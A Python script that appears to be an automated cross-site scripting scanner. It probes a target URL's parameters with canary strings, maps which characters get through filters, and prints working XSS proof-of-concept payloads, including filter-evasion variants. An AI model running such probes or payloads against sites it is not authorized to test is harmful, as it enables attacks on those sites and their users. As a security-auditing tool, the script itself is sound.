import requests
import argparse
import re
import random
import string
from urllib.parse import urlencode, urlparse, urlunparse, parse_qs
from pathlib import Path

# --- ARGUMENTS ---
parser = argparse.ArgumentParser(
    description="Automated XSS Vulnerability Scanner")
parser.add_argument('-t', '--target', type=str, help="Select target URL")
parser.add_argument('-e', '--entry-points',
                    action='store_true', help="Find entry points")
parser.add_argument('-a', '--audit', action='store_true',
                    help="Make complete auditing process")
parser.add_argument('-r', '--reset', action='store_true',
                    help="Remove current saved data")
args = parser.parse_args()

# --- CONSTANTS ---
TARGET_FILE = ".target"
ENTRY_FILE = ".entry"
PAYLOADS_FILE = "payloads.txt"

GREEN = '\033[92m'
RED = '\033[91m'
YELLOW = '\033[93m'
PURPLE = '\033[95m'
CYAN = '\033[96m'
RESET = '\033[0m'

FR = f"{GREEN}[*] Files successfully removed{RESET}"
FU = f"{GREEN}[*] File updated{RESET}"
NF = f"{RED}[!] File not found{RESET}"

# --- FILE OPERATIONS ---


def remove_files(success_msg: str = FR):
    files = [Path(TARGET_FILE), Path(ENTRY_FILE), Path(PAYLOADS_FILE)]
    for file in files:
        file.unlink(missing_ok=True)
    if success_msg:
        print(success_msg)


def write_line(file_route: str, content: str, success: str = FU, error: str = NF):
    try:
        with open(file_route, "w", encoding="UTF-8") as file:
            file.write(f"{content}\n")
            if success:
                print(success)
    except FileNotFoundError:
        print(error)
        quit()


def write_lines(file_route: str, contents: list | tuple, success: str = FU, error: str = NF):
    try:
        with open(file_route, "w", encoding="UTF-8") as file:
            for content in contents:
                file.write(f"{content}\n")
            if success:
                print(success)
    except FileNotFoundError:
        print(error)
        quit()


def get_line(file_route: str, error: str = NF):
    try:
        with open(file_route, "r", encoding="UTF-8") as file:
            return file.readline().strip()  # Added strip() to clean \n
    except FileNotFoundError:
        print(error)
        quit()


def get_lines(file_route: str, error: str = NF):
    try:
        contents = []
        with open(file_route, "r", encoding="UTF-8") as file:
            for line in file:
                if line.strip():
                    contents.append(line.strip())
            return contents
    except FileNotFoundError:
        print(error)
        quit()

# --- NETWORK OPERATIONS ---


def get_response(url: str):
    try:
        return requests.get(url, timeout=5)
    except requests.exceptions.RequestException:
        print(f"{RED}[!] Connection error reaching {url}{RESET}")
        return None

# --- PARSING & SETUP ---


def normalize_url(url: str):
    if not url.startswith(('http://', 'https://')):
        url = 'http://' + url

    parsed_url = urlparse(url)
    entry_points = tuple(parse_qs(parsed_url.query).keys())

    if entry_points:
        entry_points_str = ", ".join(entry_points)
        write_lines(ENTRY_FILE, entry_points, success=f"{
                    GREEN}[*] URL Entry point(s) found: {YELLOW}{entry_points_str}{RESET}")

    return urlunparse((parsed_url.scheme, parsed_url.netloc, parsed_url.path, parsed_url.params, '', ''))


def find_entry_points(url: str):
    response = get_response(url)
    if not response:
        return

    html = response.text
    regex = r"Undefined index:\s+([a-zA-Z0-9_-]+)"
    params = re.findall(regex, html)

    if params:
        unique_params = tuple(set(params))
        unique_params_str = ", ".join(unique_params)
        write_lines(ENTRY_FILE, unique_params, success=f"{
                    GREEN}[*] HTML Entry point(s) found: {YELLOW}{unique_params_str}{RESET}")
    else:
        print(f"{YELLOW}[!] No entry points found in HTML{RESET}")

# --- INJECTION TOOLS ---


def get_canary():
    return f"xss_{''.join(random.choices(string.ascii_lowercase + string.digits, k=6))}"


def mount_injection(url: str, entr_pnt: str, query: str):
    parsed = urlparse(url)
    encoded_query = urlencode({entr_pnt: query})
    return urlunparse((parsed.scheme, parsed.netloc, parsed.path, parsed.params, encoded_query, parsed.fragment))

# --- AUDITING LOGIC ---


def analyze_context(html: str, canary: str) -> str:
    pattern = f"(.{{0,20}}){canary}(.{{0,20}})"
    match = re.search(pattern, html, re.IGNORECASE | re.DOTALL)

    if match:
        before = match.group(1).lower()
        after = match.group(2).lower()

        if "<script" in before or "javascript" in after:
            return 'javascript'
        elif before.strip().endswith('"') or before.strip().endswith("'"):
            return 'attribute'
        elif "<" in before and ">" in after:
            return 'html_tags'
        return 'plain_text'
    return 'unknown'


def detect_filters(url: str, entr_pnt: str) -> dict:
    test_items = [
        '<', '>', '"', "'", '/', ';',
        'script', '<script>', '<img', '<svg',
        'alert', 'onerror=', 'onload=', 'javascript:'
    ]
    results = {}

    for item in test_items:
        canary_l, canary_r = get_canary(), get_canary()
        payload = f"{canary_l}{item}{canary_r}"

        res = get_response(mount_injection(url, entr_pnt, payload))
        if not res:
            continue

        match = re.search(f"{canary_l}(.*?){canary_r}",
                          res.text, re.DOTALL | re.IGNORECASE)

        if match:
            reflected = match.group(1)
            if reflected.lower() == item.lower():
                results[item] = 'clean'
            elif reflected == "":
                results[item] = 'removed'
            else:
                results[item] = f"encoded ({reflected})"
        else:
            results[item] = 'blocked'

    return results


def generate_payloads(context: str, filters: dict) -> list:
    payloads = []

    if context in ['plain_text', 'unknown']:

        if filters.get('<script>') == 'clean':
            payloads.append("<script>alert(1)</script>")
        else:
            if filters.get('<') == 'clean' and filters.get('>') == 'clean':
                payloads.append("<ScRiPt>alert(1)</sCrIpT>")
                payloads.append("<script >alert(1)</script>")

        if filters.get('<img') == 'clean' and filters.get('onerror=') == 'clean':
            payloads.append("<img src=x onerror=alert(1)>")

        if filters.get('<svg') == 'clean' and filters.get('onload=') == 'clean':
            payloads.append("<svg onload=alert(1)>")

    elif context == 'attribute':
        if filters.get('"') == 'clean':
            payloads.append('" autofocus onfocus="alert(1)')
            if filters.get('<svg') == 'clean':
                payloads.append('"><svg onload=alert(1)>')

        elif filters.get("'") == 'clean':
            payloads.append("' autofocus onfocus='alert(1)")

    elif context == 'javascript':
        if filters.get(';') == 'clean':
            payloads.append("'; alert(1); //")
            payloads.append("\"; alert(1); //")
            payloads.append("-alert(1)-")

    if not payloads:
        payloads.append(
            "No se encontraron payloads directos debido a filtros estrictos. Requiere revisión manual.")

    return payloads


def run_audit(url: str, entr_pnts: list[str]):
    print(f"\n{CYAN}========== STARTING AUDIT =========={RESET}")
    report = {}

    for entry in entr_pnts:
        print(f"\n{PURPLE}[*] Testing parameter: {entry}{RESET}")
        canary = get_canary()

        res1 = get_response(mount_injection(url, entry, canary))
        if not res1:
            continue

        # 1. Verify Reflection
        if canary in res1.text:
            xss_type = "Reflected"
            print(f"{GREEN}[+] Reflection confirmed!{RESET}")

            # 2. Verify Persistence
            res2 = get_response(url)
            if res2 and canary in res2.text:
                xss_type = "Stored"
                print(
                    f"{RED}[!!!] VULNERABILITY: Stored XSS confirmed!{RESET}")

            # 3. Analyze Context & Filters
            context = analyze_context(res1.text, canary)
            print(f"{YELLOW}[~] Context detected: {context}{RESET}")

            print(f"{YELLOW}[~] Analyzing WAF/Filters...{RESET}")
            filters = detect_filters(url, entry)

            # 4. Generate Payloads
            proposed_payloads = generate_payloads(context, filters)

            # Save to report
            report[entry] = {
                'type': xss_type,
                'context': context,
                'filters': filters,
                'payloads': proposed_payloads
            }
        else:
            print(f"[-] No reflection found for '{entry}'")

    print_report(report)


def print_report(report: dict):
    print(f"\n{CYAN}========== AUDIT REPORT =========={RESET}")
    if not report:
        print(f"{GREEN}[+] Target seems secure against automated XSS.{RESET}")
        return

    for param, data in report.items():
        print(f"\n{RED}► Parameter:{RESET} {param} ({data['type']} XSS)")
        print(f"  {YELLOW}Context:{RESET} {data['context']}")

        # Format filters clearly
        clean_chars = [k for k, v in data['filters'].items() if v == 'clean']
        print(f"  {YELLOW}Allowed Chars:{RESET} {
              ', '.join(clean_chars) if clean_chars else 'None'}")

        print(f"  {GREEN}Proposed Payloads:{RESET}")
        for p in data['payloads']:
            print(f"    - {p}")

        write_lines(PAYLOADS_FILE, data['payloads'], success=f"\n{
                    GREEN}[*] Payloads saved to {PAYLOADS_FILE}{RESET}", error="")

# --- MAIN RUNNER ---


def main():
    if args.reset:
        remove_files()

    if args.target:
        remove_files(success_msg="")
        url = normalize_url(args.target)
        write_line(TARGET_FILE, url, success=f"{
                   GREEN}[*] Target URL set: {YELLOW}{url}{RESET}")

    target_url = get_line(TARGET_FILE, error=f"{
                          RED}[!] Target URL not found. Use '-t' argument.{RESET}")

    if args.entry_points:
        find_entry_points(target_url)

    if args.audit:
        entry_points = get_lines(ENTRY_FILE, error=f"{
                                 RED}[!] Entry points not found. Use '-e' to scan HTML or '-t' to set parameters in URL.{RESET}")
        run_audit(target_url, entry_points)


if __name__ == "__main__":
    main()
